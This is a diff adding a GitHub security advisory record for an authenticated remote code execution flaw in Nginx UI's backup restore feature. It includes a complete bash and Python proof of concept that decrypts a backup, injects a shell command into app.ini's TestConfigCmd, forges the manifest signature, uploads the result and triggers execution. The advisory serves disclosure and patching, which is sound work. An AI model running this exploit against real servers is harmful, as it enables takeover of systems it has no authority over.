@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-p393-cf76-4jmr",
+  "modified": "2026-10-09T21:00:14.059685088Z",
+  "published": "2026-10-09T20:45:02Z",
+  "aliases": [
+    "CVE-2026-107806"
+  ],
+  "summary": "Nginx UI: Authenticated Remote Code Execution via Backup Restore App Config Overwrite",
+  "details": "## Summary\n\nAn authenticated nginx-ui user can call `POST /api/restore`, upload a forged encrypted backup, restore `app.ini`, set nginx command settings such as `TestConfigCmd`, and then trigger command execution with `POST /api/nginx/test`.\n\nThis was validated on nginx-ui `2.3.11 2(523) 6c86e5a5` in the local Docker container `uozi/nginx-ui:latest`.\n\n\n\n\n## Impact\n\nAn authenticated user can overwrite nginx-ui application configuration and database state through restore, including protected settings that are normally not writable through the settings API. By setting nginx command fields in the restored `app.ini`, the attacker can execute commands in the nginx-ui runtime context. This affects confidentiality, integrity, and availability because the attacker can read or replace secrets, change node/JWT secrets, corrupt application state, and execute arbitrary commands.\n\n## Affected Version / Environment\n\n- Version: `nginx-ui 2.3.11 2(523) 6c86e5a5`\n- Deployment: local Docker, `uozi/nginx-ui:latest`\n- Base URL used in validation: `http://127.0.0.1:8080`\n\n\n## Root Cause\n\n`/api/restore` is reachable through normal authenticated-user authorization. The restore handler accepts attacker-supplied backup key material, validates the manifest with a key derived from that supplied AES key, decrypts attacker-controlled backup contents, and copies restored `app.ini` into the live nginx-ui config path.\n\nRelevant code paths:\n\n- `api/backup/router.go`: `POST /api/restore`\n- `api/backup/restore.go`: accepts `security_token` and uploaded backup file\n- `internal/backup/manifest.go`: derives backup signing key from supplied AES key\n- `internal/backup/restore.go`: `restoreNginxUIConfig` overwrites live `app.ini`\n- `internal/nginx/exec.go`: nginx command settings execute through shell-backed command paths\n\n## Proof of Concept\n\nAssumptions:\n\n- nginx-ui is already running.\n- `$TOKEN` is a valid user JWT.\n- `$CONTAINER` is the local disposable Docker container name for cleanup and evidence checks.\n\n```bash\nexport BASE='http://127.0.0.1:8080'\nexport TOKEN='\u003cvalid nginx-ui JWT\u003e'\nexport CONTAINER='nginx-ui'\n```\n\nRun only against a disposable local instance.\n\n```bash\nset -eu\n\nTMP=$(mktemp -d)\ntrap 'rm -rf \"$TMP\"' EXIT\n\ndocker cp \"$CONTAINER\":/etc/nginx-ui/app.ini \"$TMP/app.ini.original\"\n\ncurl -sS -D \"$TMP/backup.headers\" -o \"$TMP/backup.zip\" \\\n  -H \"Authorization: $TOKEN\" \\\n  \"$BASE/api/backup\"\n\nSEC=$(awk 'BEGIN{IGNORECASE=1} /^X-Backup-Security:/{gsub(\"\\r\",\"\"); print $2}' \"$TMP/backup.headers\")\nKEY_B64=${SEC%%:*}\nIV_B64=${SEC#*:}\nKEY_HEX=$(printf '%s' \"$KEY_B64\" | base64 -d | xxd -p -c 256)\nIV_HEX=$(printf '%s' \"$IV_B64\" | base64 -d | xxd -p -c 256)\n\nmkdir -p \"$TMP/outer\" \"$TMP/inner\"\nunzip -q \"$TMP/backup.zip\" -d \"$TMP/outer\"\nopenssl enc -d -aes-256-cbc -K \"$KEY_HEX\" -iv \"$IV_HEX\" -nosalt \\\n  -in \"$TMP/outer/nginx-ui.zip\" \\\n  -out \"$TMP/nginx-ui.clear.zip\"\nunzip -q \"$TMP/nginx-ui.clear.zip\" -d \"$TMP/inner\"\n\npython3 - \"$TMP/inner/app.ini\" \u003c\u003c'PY'\nfrom pathlib import Path\nimport sys\n\np = Path(sys.argv[1])\ncmd = \"TestConfigCmd = printf restored-rce \u003e/tmp/nginx-ui-restore-rce\"\nlines = p.read_text().splitlines()\nout = []\nin_nginx = False\nseen_nginx = False\nwritten = False\n\nfor line in lines:\n    s = line.strip()\n    if s.startswith(\"[\") and s.endswith(\"]\"):\n        if in_nginx and not written:\n            out.append(cmd)\n            written = True\n        in_nginx = s.lower() == \"[nginx]\"\n        seen_nginx = seen_nginx or in_nginx\n    if in_nginx and s.startswith(\"TestConfigCmd\"):\n        if not written:\n            out.append(cmd)\n            written = True\n        continue\n    out.append(line)\n\nif in_nginx and not written:\n    out.append(cmd)\nelif not seen_nginx:\n    out.extend([\"\", \"[nginx]\", cmd])\n\np.write_text(\"\\n\".join(out) + \"\\n\")\nPY\n\n(cd \"$TMP/inner\" \u0026\u0026 zip -qr \"$TMP/nginx-ui.modified.clear.zip\" .)\nopenssl enc -aes-256-cbc -K \"$KEY_HEX\" -iv \"$IV_HEX\" -nosalt \\\n  -in \"$TMP/nginx-ui.modified.clear.zip\" \\\n  -out \"$TMP/outer/nginx-ui.zip\"\n\nOUTER=\"$TMP/outer\" KEY_B64=\"$KEY_B64\" python3 \u003c\u003c'PY'\nfrom pathlib import Path\nimport base64\nimport hashlib\nimport hmac\nimport json\nimport os\n\nouter = Path(os.environ[\"OUTER\"])\nkey = base64.b64decode(os.environ[\"KEY_B64\"])\nmanifest = json.loads((outer / \"manifest.json\").read_text())\n\nfor entry in manifest[\"files\"]:\n    data = (outer / entry[\"name\"]).read_bytes()\n    entry[\"sha256\"] = hashlib.sha256(data).hexdigest()\n    entry[\"size\"] = len(data)\n\nmanifest[\"files\"] = sorted(manifest[\"files\"], key=lambda e: e[\"name\"])\nmanifest_bytes = json.dumps(manifest, separators=(\",\", \":\")).encode()\n(outer / \"manifest.json\").write_bytes(manifest_bytes)\n\nsigning_key = hashlib.sha256(b\"nginx-ui-backup-signing-v1:\" + key).digest()\n(outer / \"manifest.sig\").write_text(hmac.new(signing_key, manifest_bytes, hashlib.sha256).hexdigest())\nPY\n\n(cd \"$TMP/outer\" \u0026\u0026 zip -qr \"$TMP/malicious-restore.zip\" manifest.sig nginx-ui.zip nginx.zip manifest.json)\n\ncurl -sS -X POST \"$BASE/api/restore\" \\\n  -H \"Authorization: $TOKEN\" \\\n  -F \"restore_nginx=false\" \\\n  -F \"restore_nginx_ui=true\" \\\n  -F \"verify_hash=true\" \\\n  -F \"security_token=$SEC\" \\\n  -F \"backup_file=@$TMP/malicious-restore.zip\"\n\nsleep 10\nfor i in $(seq 1 80); do\n  curl -sS -o /dev/null -H \"Authorization: $TOKEN\" \"$BASE/api/settings\" \u0026\u0026 break\n  sleep 0.5\ndone\n\ncurl -sS -X POST \"$BASE/api/nginx/test\" \\\n  -H \"Authorization: $TOKEN\"\n\ndocker exec \"$CONTAINER\" sh -lc 'cat /tmp/nginx-ui-restore-rce'\n\n# Cleanup and return the disposable instance to its original config.\ndocker cp \"$TMP/app.ini.original\" \"$CONTAINER\":/etc/nginx-ui/app.ini\ndocker exec \"$CONTAINER\" sh -lc 'rm -f /tmp/nginx-ui-restore-rce'\ndocker restart \"$CONTAINER\"\n```\n\nExpected output:\n\n```text\n{\"nginx_ui_restored\":true,\"nginx_restored\":false,\"hash_match\":true}\n{\"message\":\"\",\"level\":-1,\"test_scope\":\"global\"}\nrestored-rce\n```\n\n## Cleanup\n\nThe PoC performs cleanup at the end. If interrupted, restore the original `app.ini` from a known-good backup, remove `/tmp/nginx-ui-restore-rce`, and restart nginx-ui before continuing other tests.\n\n## Patch Guidance\n\nRequire an elevated/admin secure session for restore, do not allow ordinary authenticated users to restore nginx-ui app state, bind backup manifest signatures to a server-side secret or administrator-held passphrase, and block protected app settings from being restored unless explicitly approved through a hardened migration path.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/0xJacky/Nginx-UI",
+        "purl": "pkg:golang/github.com/0xJacky/Nginx-UI"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.9.10-0.20260421071512-7864e378f5cf"
+            },
+            {
+              "fixed": "1.9.10-0.20260728074146-a467ed652591"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-p393-cf76-4jmr/GHSA-p393-cf76-4jmr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-p393-cf76-4jmr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-107806"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/commit/a467ed652591fc0cd1b466a1ec751b493faef9f7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/0xJacky/nginx-ui"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/releases/tag/v2.5.0"
+    }
+  ]
+}
